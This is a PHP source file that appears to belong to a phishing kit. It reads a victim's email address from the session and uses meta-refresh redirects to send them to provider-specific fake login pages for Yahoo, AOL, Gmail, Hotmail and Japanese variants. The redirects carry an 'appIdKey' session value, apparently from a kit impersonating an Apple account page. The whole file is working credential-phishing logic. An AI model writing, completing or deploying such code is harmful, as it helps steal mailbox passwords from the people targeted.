<?php
session_start();
$email = explode("@",$_SESSION['email']);

if(preg_match('/yahoo.co.jp/', $email[1]) or preg_match('/yahoo.jp/', $email[1])) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=yahoojp_login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}else if(preg_match('/yahoo/', $email[1]) or preg_match('/ymail/', $email[1])) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=yahoo_login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}else if(preg_match('/aol/', $email[1])) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=aol_login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}else if(preg_match('/gmail/', $email[1])) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=gmail_login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}else if(preg_match('/hotmail.co.jp/', $email[1]) or preg_match('/live.jp/', $email[1]) or preg_match('/msn.jp/', $email[1]) or preg_match('/hotmail.com.jp/', $email[1])) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=hotmailjp_login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}else if(preg_match('/hotmail/', $email[1]) or preg_match('/live/', $email[1]) or preg_match('/msn/', $email[1]) or preg_match('/passport/', $email[1])) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=hotmail_login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}else{
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
	exit();
}
?>